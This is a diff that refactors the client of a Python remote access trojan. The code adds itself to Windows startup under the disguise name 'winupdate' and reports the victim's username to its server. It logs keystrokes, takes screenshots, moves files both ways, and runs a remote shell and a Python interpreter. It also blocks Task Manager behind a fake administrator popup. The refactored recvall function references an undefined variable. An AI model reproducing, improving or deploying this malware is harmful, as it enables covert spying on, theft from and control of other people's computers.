@@ -67,10 +67,10 @@ def startup(onstartup):
         CloseKey(objRegKey)
     except WindowsError:
         if not onstartup:
-            send(str.encode("Unable to add to startup! "))
+            send(b"Unable to add to startup!")
     else:
         if not onstartup:
-            send(str.encode("success"))
+            send(b"success")
 
 
 def remove_from_startup():
@@ -79,11 +79,11 @@ def remove_from_startup():
         DeleteValue(objRegKey, "winupdate")
         CloseKey(objRegKey)
     except FileNotFoundError:
-        send(str.encode("Program is not registered in startup."))
+        send(b"Program is not registered in startup.")
     except WindowsError:
-        send(str.encode("Error removing value!"))
+        send(b"Error removing value!")
     else:
-        send(str.encode("success"))
+        send(b"success")
 
 
 def server_connect():
@@ -104,15 +104,15 @@ def server_connect():
         strPlatform += " (Virtual Machine) "
     arrUserInfo.extend([strPlatform, os.environ['USERNAME']])
 
-    send(str.encode(json.dumps(arrUserInfo)))
+    send(json.dumps(arrUserInfo).encode())
 
 # function to return decoded utf-8
 decode_utf8 = lambda data: data.decode("utf-8", errors="replace")
 
-# function to receive and decrypt data
+# function to receive data
 recv = lambda buffer: objSocket.recv(buffer)
 
-# function to send encrypted data
+# function to send data
 send = lambda data: objSocket.send(data)
 
 if blnMeltFile: meltFile()
@@ -137,9 +137,9 @@ def OnKeyboardEvent(event):
     elif event == Key.space:
         strKeyLogs += " "
     elif type(event) == Key:  # if the character is some other type of special key
-        strKeyLogs += " [" + str(event)[4:] + "] "
+        strKeyLogs += f" [{str(event)[4:]}] "
     else:
-        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character
+        strKeyLogs += f"{event}"
 
 
 KeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)
@@ -148,18 +148,14 @@ Key = pynput.keyboard.Key
 
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
-    while True:
-        bytPart = recv(buffer)
-        if len(bytPart) == buffer:
-            return bytPart
-        bytData += bytPart
-        if len(bytData) == buffer:
-            return bytData
+    while len(data) < buffer:
+        bytData += recv(buffer)
+    return bytData
 
 
 # vbs message box
 def MessageBox(message):
-    strScript = os.path.join(TMP + "m.vbs")
+    strScript = os.path.join(TMP, "m.vbs")
     with open(strScript, "w") as objVBS:
         objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
     subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
@@ -176,7 +172,7 @@ def screenshot():
         objPic = objBytes.getvalue()
 
     # send screenshot information to server
-    send(str(len(objPic)).encode())
+    send(f"{len(objPic)}".encode())
     time.sleep(1)
     # Send Image Data to Server
     send(objPic)
@@ -189,7 +185,7 @@ def file_browser():
     strDrives = ""
     for drive in arrRawDrives:  # get proper view and place array into string
         strDrives += drive.replace("\\", "") + "\n"
-    send(str.encode(strDrives))
+    send(strDrives.encode())
 
     strDir = decode_utf8(recv(intBuff))
 
@@ -200,14 +196,14 @@ def file_browser():
 
         strFiles = ""
         for file in arrFiles:
-            strFiles += (file + "\n")
+            strFiles += f"{file}\n"
 
-        send(str.encode(str(len(strFiles))))  # send buffer size
+        send(f"{len(strFiles)}".encode())  # send buffer size
         time.sleep(0.1)
-        send(str.encode(strFiles))
+        send(strFiles.encode())
 
     else:  # if the user entered an invalid directory
-        send(str.encode("Invalid Directory!"))
+        send(b"Invalid Directory!")
         return
 
 
@@ -219,17 +215,17 @@ def upload(data):
     try:
         with open(strOutputFile, "wb") as objFile:
             objFile.write(file_data)
-        send(str.encode("Done!!!"))
+        send(b"Done!")
     except:
-        send(str.encode("Path is protected/invalid!"))
+        send(b"Path is protected/invalid!")
 
 
 def receive(data):
     if not os.path.isfile(data):
-        send(str.encode("Target file not found!"))
+        send(b"Target file not found!")
         return
 
-    send(str(os.path.getsize(data)).encode())
+    send(f"{os.path.getsize(data)}".encode())
     time.sleep(1)
     with open(data, 'rb') as objFile:
         send(objFile.read()) # Send Contents of File
@@ -259,31 +255,31 @@ def command_shell():
 
         elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
             objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
+            if objCommand.stderr.read().decode() == "":  # if there is no error
                 strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                 os.chdir(strOutput)  # change directory
 
-                bytData = str.encode(f"\n{str(os.getcwd())}>")  # output to send the server
+                bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
 
         elif len(strData) > 0:
             objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it
 
-            bytData = str.encode(f"{strOutput}\n{os.getcwd()}>")
+            bytData = f"{strOutput}\n{os.getcwd()}>".encode()
         else:
-            bytData = str.encode("Error!!!")
+            bytData = b"Error!"
 
-        strBuffer = str(len(bytData))
-        send(str.encode(strBuffer))  # send buffer size
+        strBuffer = f"{len(bytData)}"
+        send(strBuffer.encode())  # send buffer size
         time.sleep(0.1)
         send(bytData)  # send output
 
 def python_interpreter():
-    send(str.encode("received"))
+    send(b"received")
     while True:
-        strCommand = recv(intBuff).decode("utf-8")
+        strCommand = recv(intBuff).decode()
         if strCommand == "exit":
-            send(str.encode("exiting"))
+            send(b"exiting")
             break
         old_stdout = sys.stdout
         redirected_output = sys.stdout = StringIO()
@@ -304,8 +300,10 @@ def python_interpreter():
         else:
             send(redirected_output.getvalue().encode())
 
-def vbs_block_process(process, popup, message, title, timeout, type):
+def vbs_block_process(process, popup=False):
     # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
+    # popup: list
+    # [message, title, timeout, type]
 
     strVBSCode = "On Error Resume Next\n" + \
                  "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
@@ -315,31 +313,34 @@ def vbs_block_process(process, popup, message, title, timeout, type):
                  "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
                  f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
                  "objLatestProcess.TargetInstance.Terminate\n"
-    if popup == "True":  # if showing a message
-        strVBSCode += f'objWshShl.Popup "{message}",{timeout}, "{title}",{type}\n'
+    if popup:  # if showing a message
+        strVBSCode += f'objWshShl.Popup "{popup[0]}", {popup[1]}, "{popup[2]}", {popup[3]}\n'
 
     strVBSCode += "End If\nLoop"
 
-    with open(TMP + "/d.vbs", "w") as objVBSFile:
+    strScript = os.path.join(TMP, "d.vbs")
+
+    with open(strScript, "w") as objVBSFile:
         objVBSFile.write(strVBSCode)
 
-    subprocess.Popen(["cscript", TMP + "/d.vbs"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)  # run the script
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)  # run the script
 
 
 def disable_taskmgr():
     global blnDisabled
-    if blnDisabled == "False":  # if task manager is already disabled, enable it
-        send(str.encode("Enabling ..."))
+    if not blnDisabled:  # if task manager is already disabled, enable it
+        send(b"Enabling ...")
 
         subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
-        blnDisabled = "True"
+        blnDisabled = True
     else:
-        send(str.encode("Disabling ..."))
+        send(b"Disabling ...")
 
-        vbs_block_process("taskmgr.exe", "True", "Task Manager has been disabled by your administrator",
-                      "Task Manager", "3", "16")
-        blnDisabled = "False"
+        popup = ["Task Manager has been disabled by your administrator", "Task Manager", "3", "16"]
+
+        vbs_block_process("taskmgr.exe", popup=popup)
+        blnDisabled = False
 
 
 def keylogger(option):
@@ -348,49 +349,46 @@ def keylogger(option):
     if option == "start":
         if not KeyListener.running:
             KeyListener.start()
-            send(str.encode("success"))
+            send(b"success")
         else:
-            send(str.encode("error"))
+            send(b"error")
 
     elif option == "stop":
         if KeyListener.running:
             KeyListener.stop()
             threading.Thread.__init__(KeyListener)  # re-initialise the thread
             strKeyLogs = ""
-            send(str.encode("success"))
+            send(b"success")
         else:
-            send(str.encode("error"))
+            send(b"error")
 
     elif option == "dump":
         if not KeyListener.running:
-            send(str.encode("error"))
+            send(b"error")
         else:
             if strKeyLogs == "":
-                send(str.encode("error2"))
+                send(b"error2")
             else:
                 time.sleep(0.2)
-                send(str.encode(str(len(strKeyLogs))))  # send buffer size
+                send(f"{len(strKeyLogs)}".encode())  # send buffer size
                 time.sleep(0.2)
-                send(str.encode(strKeyLogs))  # send logs
+                send(strKeyLogs.encode())  # send logs
 
                 strKeyLogs = ""  # clear logs
 
 
 def run_command(command):
-    strLogOutput = "\n"
+    LogOutput = b"\n"
 
     if len(command) > 0:
         objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="ignore")
+        LogOutput += objCommand.stdout.read() + objCommand.stderr.read()
     else:
-        strLogOutput += "Error!!!"
+        LogOutput += b"Error!"
 
-    bytData = str.encode(strLogOutput)
-
-    strBuffer = str(len(bytData))
-    send(str.encode(strBuffer))  # send buffer size
+    send(f"{len(LogOutput)}".encode())  # send buffer size
     time.sleep(0.1)
-    send(bytData)  # send output
+    send(LogOutput)  # send output
 
 
 while True:
@@ -438,7 +436,7 @@ while True:
                 run_command(strData[6:])
             elif strData == "dtaskmgr":
                 if not "blnDisabled" in globals():  # if the variable doesnt exist yet
-                    blnDisabled = "True"
+                    blnDisabled = True
                 disable_taskmgr()
     except socket.error:  # if the server closes without warning
         objSocket.close()
